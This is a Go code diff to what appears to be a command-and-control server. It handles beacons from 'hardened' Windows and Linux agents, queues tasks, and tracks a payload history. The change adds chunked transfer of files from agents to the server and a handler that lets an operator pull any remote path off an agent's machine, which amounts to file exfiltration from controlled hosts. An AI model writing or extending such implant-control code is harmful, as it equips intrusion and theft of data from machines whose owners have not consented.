@@ -127,7 +127,7 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 	// Agent HTTP beacon endpoints (for the hardened C++ Windows agent).
 	// Separate from WebSocket /ws/agent used by the Rust Linux agent.
 	r.POST("/agent", agentGate(), agentHTTPBeaconHandler(agentMgr))
-	r.POST("/beacon", agentGate(), agentHTTPDataTaskHandler(agentMgr, taskQueue))
+	r.POST("/beacon", agentGate(), agentHTTPDataTaskHandler(agentMgr, taskQueue, fileMgr))
 
 	// Health on the public API port — Railway/Render hit this via $PORT.
 	r.GET("/health", func(c *gin.Context) {
@@ -152,8 +152,9 @@ func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queu
 	}
 }
 
-func agentHTTPDataTaskHandler(agentMgr *agent.Manager, taskQueue *task.Queue) gin.HandlerFunc {
+func agentHTTPDataTaskHandler(agentMgr *agent.Manager, taskQueue *task.Queue, fileMgr *filetransfer.Manager) gin.HandlerFunc {
 	return func(c *gin.Context) {
+		raw, _ := io.ReadAll(io.LimitReader(c.Request.Body, 16<<20))
 		var msg struct {
 			Type   string `json:"type"`
 			HwID   string `json:"hw_id"`
@@ -163,7 +164,7 @@ func agentHTTPDataTaskHandler(agentMgr *agent.Manager, taskQueue *task.Queue) gi
 			Code   int    `json:"code"`
 			Output string `json:"output"`
 		}
-		if err := c.ShouldBindJSON(&msg); err != nil {
+		if err := json.Unmarshal(raw, &msg); err != nil {
 			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
 			return
 		}
@@ -176,6 +177,18 @@ func agentHTTPDataTaskHandler(agentMgr *agent.Manager, taskQueue *task.Queue) gi
 		saveLive()
 
 		switch msg.Type {
+		case "file_chunk":
+			if fileMgr != nil {
+				fileMgr.HandleChunk(a.ID, msg.TaskID, raw)
+			}
+			c.JSON(http.StatusOK, gin.H{"status": "ok"})
+			return
+		case "file_complete":
+			if fileMgr != nil {
+				fileMgr.HandleComplete(a.ID, msg.TaskID, raw)
+			}
+			c.JSON(http.StatusOK, gin.H{"status": "ok"})
+			return
 		case "result":
 			if taskQueue != nil && msg.TaskID != "" {
 				_ = taskQueue.UpdateResult(msg.TaskID, msg.Output, msg.Code)
@@ -436,20 +449,29 @@ func downloadFileHandler(fileMgr *filetransfer.Manager, taskQueue *task.Queue) g
 	return func(c *gin.Context) {
 		agentID := c.Param("id")
 		var req struct {
-			RemotePath string `json:"remote_path" binding:"required"`
+			RemotePath string `json:"remote_path"`
+			Path       string `json:"path"`
 		}
 		if err := c.ShouldBindJSON(&req); err != nil {
 			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 			return
 		}
+		remote := strings.TrimSpace(req.RemotePath)
+		if remote == "" {
+			remote = strings.TrimSpace(req.Path)
+		}
+		if remote == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "remote_path required"})
+			return
+		}
 
-		ft, err := fileMgr.CreateDownload(agentID, req.RemotePath, req.RemotePath)
+		ft, err := fileMgr.CreateDownload(agentID, remote, remote)
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 			return
 		}
 
-		t, err := taskQueue.EnqueueDownload(agentID, req.RemotePath, ft.TempPath, 10)
+		t, err := taskQueue.EnqueueDownload(agentID, remote, ft.TempPath, ft.ID, 10)
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 			return
@@ -1235,6 +1257,11 @@ func getPayloadHistoryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 			return
+		}
+		if payloads == nil {
+			// A nil slice marshals to `null`, which makes the history panel's
+			// .map() throw and the whole download list disappear.
+			payloads = []PayloadRecord{}
 		}
 		c.JSON(http.StatusOK, payloads)
 	}
